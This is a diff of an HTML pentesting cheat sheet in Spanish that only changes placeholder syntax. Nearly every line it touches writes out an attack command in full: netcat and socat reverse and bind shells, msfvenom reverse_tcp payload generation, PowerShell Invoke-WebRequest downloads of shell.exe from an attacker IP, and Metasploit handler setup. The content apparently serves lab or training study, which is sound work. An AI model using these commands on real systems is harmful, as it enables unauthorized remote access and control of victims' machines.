@@ -95,13 +95,13 @@
                 <ol>
                     <li><span class="comando2">Creamos el listener en la maquina atacante</span>:
                         <pre><code class="language-bash line-numbers"data-start="1"
-                                >sudo nc -lvnp &lt;PORT&gt;</code></pre>
+                                >sudo nc -lvnp &lbrack;PORT&rbrack;</code></pre>
 
                         </span>
                     </li>
                     <li><span class="comando2">Crear una reverse shell en el target </span>:
                         <pre><code class="language-bash line-numbers"data-start="1"
-                            >nc &lt;TURN0&gt; &lt;PORT&gt; -e /bin/bash</code></pre>
+                            >nc &lbrack;TURN0&rbrack; &lbrack;PORT&rbrack; -e /bin/bash</code></pre>
                         <ol>
                             <span class="comando3">Puede ser tambien un .exe para Windows</span>:
                             <span class="comando4">"cmd.exe" </span>
@@ -112,12 +112,12 @@
                     <li><span class="comando5">Opcion 2</span></li>
                     <li><span class="comando2">Creamos el listener en la maquina atacante</span>:
                         <pre><code class="language-bash line-numbers"data-start="1"
-                            >sudo nc -lvnp &lt;PORT&gt;</code></pre>
+                            >sudo nc -lvnp &lbrack;PORT&rbrack;</code></pre>
 
                     </li>
                     <li><span class="comando2">Crear una reverse shell en el target </span>:
                         <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
-                            > mkfifo /tmp/f; nc &lt;TARGET&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&1; rm /tmp/f</code></pre>
+                            > mkfifo /tmp/f; nc &lbrack;TARGET&rbrack; &lbrack;PORT&rbrack; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&1; rm /tmp/f</code></pre>
                     </li>
                 </ol>
             </li>
@@ -129,11 +129,11 @@
                 <ol>
                     <li><span class="comando2">Crear una reverse shell en el target </span>:
                         <pre><code class="language-bash line-numbers"data-start="1"
-                            >nc -lvnp &lt;PORT&gt; -e "cmd.exe"</code></pre>
+                            >nc -lvnp &lbrack;PORT&rbrack; -e "cmd.exe"</code></pre>
                     </li>
                     <li><span class="comando2">Creamos el listener en la maquina atacante</span>:
                         <pre><code class="language-bash line-numbers"data-start="1"
-                                >nc &lt;LOCAL IP&gt; &lt;PORT&gt; </code></pre>
+                                >nc &lbrack;LOCAL IP&rbrack; &lbrack;PORT&rbrack; </code></pre>
 
                         <ol>
                             <span class="comando3">Puede ser tambien un .exe para Windows</span>:
@@ -149,12 +149,12 @@
 
                     <li><span class="comando2">Crearemos una bind shell en el target</span>:
                         <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&1; rm /tmp/f </code></pre>
+                            >mkfifo /tmp/f; nc -lvnp &lbrack;PORT&rbrack; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f </code></pre>
 
                     </li>
                     <li><span class="comando2">En nuestra maquina atacante </span>:
                         <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >nc &lt;Target&gt; &lt;PORT&gt; </code></pre>
+                            >nc &lbrack;TARGET&rbrack; &lbrack;PORT&rbrack; </code></pre>
                     </li>
 
                     <li><img src="/images/powershell.png" /><span class="comando2">Cuando la maquina es Windows</span>
@@ -175,20 +175,20 @@
                 <ol>
                     <li><span class="comando2">Creamos el listener en la maquina atacante</span>:
                         <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >socat TCP-L:&lt;PORT&gt;-&lt;PORT&gt;</code></pre>
+                            >socat TCP-L:&lbrack;PORT&rbrack; -</code></pre>
 
                     </li>
                     <li><img src="/images/tux.png" /><span class="comando2">Crear una reverse shell en el target en
                             Linux:</span>:
                         <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >socat TCP:&lt;TURN0&gt;:&lt;PORT&gt; EXEC:"bash -li"</code></pre>
+                                >socat TCP:&lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack; EXEC:"bash -li"</code></pre>
 
                     </li>
 
                     <li><img src="/images/powershell.png" /><span class="comando2">Crear una reverse shell en el target
                             de Windows </span>:
                         <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >socat TCP:&lt;TURN0&gt;:&lt;PORT&gt; EXEC:powershell.exe,pipes</code></pre>
+                                >socat TCP:&lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack; EXEC:powershell.exe,pipes</code></pre>
 
                     </li>
                 </ol>
@@ -201,18 +201,18 @@
                     <li><img src="/images/tux.png" /><span class="comando2">Crear una reverse shell en el target en
                             linux </span>:
                         <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >socat TCP-L:&lt;PORT&gt; EXEC:"bash -li"</code></pre>
+                                >socat TCP-L:&lbrack;PORT&rbrack; EXEC:"bash -li"</code></pre>
                     </li>
                     <li><img src="/images/powershell.png" /><span class="comando2">Crear una reverse shell en el target
                             en windows </span>:
                         <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes</code></pre>
+                                >socat TCP-L:&lbrack;PORT&rbrack; EXEC:powershell.exe,pipes</code></pre>
 
                     </li>
 
                     <li><span class="comando2">Creamos el listener en la maquina atacante</span>:
                         <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >socat TCP:&lt;Target&gt;:&lt;PORT&gt; -</code></pre>
+                            >socat TCP:&lbrack;TARGET&rbrack;:&lbrack;PORT&rbrack; -</code></pre>
 
                     </li>
 
@@ -241,7 +241,7 @@
 
                     <li><span class="comando2">Ir a windows y abrir Powershell</span>:
                         <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >Invoke-WebRequest -uri http://&lt;TURN0&gt;/socat.exe -outfile C:\\Windows\temp\socat.exe</code></pre>
+                            >Invoke-WebRequest -uri http://&lbrack;TURN0&rbrack;socat.exe -outfile C:\\Windows\temp\socat.exe</code></pre>
                         <ol>
                             <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"> Invoke-WebRequest -uri http://10.10.10.123:80/socat -outfile C:\\Windows\temp\socat.exe</code></pre>
                         </ol>
@@ -249,11 +249,11 @@
                     <li><span class="comando2">Comprobamos que se subio el archivo</span></li>
                     <li><span class="comando2">Ahora ponemos un listener con socat</span>:
                         <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >socat TCP-L:&lt;PORT&gt; -</code></pre>
+                            >socat TCP-L:&lbrack;PORT&rbrack; -</code></pre>
                     <li><span class="comando2">Ahora nos vamo a windows y ejecuatamos el comando en powershell</span>:
 
                         <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
-                            >socat TCP:&lt;TURN0&gt;:&lt;PORT&gt; EXEC:powershell.exe,pipes</code></pre>
+                            >socat TCP:&lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack; EXEC:powershell.exe,pipes</code></pre>
                     </li>
                 </ol>
             </li>
@@ -344,7 +344,7 @@
 
                         <ol>
                             <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
-                                >msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;</code></pre>
+                                >msfvenom -p &lbrack;PAYLOAD&rbrack; &lbrack;OPTIONS&rbrack;</code></pre>
 
                         </ol>
                     </li>
@@ -353,7 +353,7 @@
                         <ol>
 
                             <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                    >msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lt;turn0&gt; LPORT=&lt;listen-port&gt;</code></pre>
+                                    >msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lbrack;TURN0&rbrack; LPORT=&lbrack;LISTE-PORT&rbrack;</code></pre>
 
 
                             <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
@@ -370,7 +370,7 @@
                     <li> <span class="comando2"> Abrimos PowerShell en el target y descargamos la shell</span>
                         <ol>
                             <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                    >Invoke-WebRequest -uri http://&lt;TURN0&gt;:&lt;PORT&gt;/&lt;reverse-file&gt; -outfile C:\\Windows\temp\shell.exe</code></pre>
+                                    >Invoke-WebRequest -uri http://&lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack;/&lt;reverse-file&gt; -outfile C:\\Windows\temp\shell.exe</code></pre>
 
 
                             <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
@@ -387,11 +387,11 @@
                                 >use multi/handler</code></pre>
                             <li><span class="comando3">Configuramos el PAYLOAD, LHOST Y LPORT</span></li>
                             <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >set PAYLOAD &lt;payload&gt;</code></pre>
+                                >set PAYLOAD &lbrack;PAYLOAD&rbrack;</code></pre>
                             <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >set LHOST &lt;TURN0&gt;</code></pre>
+                                >set LHOST &lbrack;TURN0&rbrack;</code></pre>
                             <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >set LPORT &lt;LISTEN-PORT&gt;</code></pre>
+                                >set LPORT &lbrack;LISTEN-PORT&rbrack;</code></pre>
                             <li><span class="comando3">Ejecutamos</span></li>
                             <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >exploit -j</code></pre>
@@ -409,7 +409,7 @@
                     <li><span class="comando2">Cargamos la session</span>
                         <ol>
                             <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >sessions &lt;session num&gt;</code></pre>
+                                >sessions &lbrack;SESSION NUM&rbrack;</code></pre>
                             <li><span class="comando3">Entramos a la consola de Windows</span></li>
                         </ol>
                     </li>
@@ -432,7 +432,7 @@
                     <li><span class="comando2">Configuramos la shell</span>
                         <ol>
                             <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;</code></pre>
+                                >msfvenom -p &lbrack;PAYLOAD&rbrack; &lbrack;OPTIONS&rbrack; </code></pre>
 
                         </ol>
                     </li>
@@ -440,7 +440,7 @@
                         <ol>
 
                             <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                    >msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=&lt;turn0&gt; LPORT=&lt;listen-port&gt;</code></pre>
+                                    >msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=&lbrack;TURN0&rbrack; LPORT=&lbrack;LISTEN-PORT&rbrack;</code></pre>
 
                             <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                         >msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=10.10.10.123 LPORT=443</code></pre>
@@ -458,7 +458,7 @@
                     <li><span class="comando2"> Abrimos PowerShell en el target y descargamos la shell</span>
                         <ol>
                             <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >Invoke-WebRequest -uri http://&lt;TURN0&gt;:&lt;PORT&gt;/&lt;reverse-file&gt; -outfile C:\\Windows\temp\shell.exe</code></pre>
+                                >Invoke-WebRequest -uri http://&lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack;/&lbrack;REVERSE-FILE&rbrack; -outfile C:\\Windows\temp\shell.exe</code></pre>
 
                             <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
                                     >Invoke-WebRequest -uri http://10.10.10.123:80/shell.exe -outfile C:\\Windows\temp\shell.exe</code></pre>
@@ -471,7 +471,7 @@
                     <li><span class="comando2">Habilitamos el listener en nuestra maquina atacante</span>
                         <ol>
                             <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
-                                >nc -lvp &lt;PORT&gt; </code></pre>
+                                >nc -lvp &lbrack;PORT&rbrack; </code></pre>
 
                         </ol>
                     </li>
@@ -669,7 +669,7 @@
                         <ol>
                             <li><span class="comando3">En linux ejecutamos el siguiente comando</span></li>
                             <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
-                                >wget &lt;turn0&gt;:&lt;port&gt;/file</code></pre>
+                                >wget &lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack;/file</code></pre>
                         </ol>
                     </li>
                 </ol>
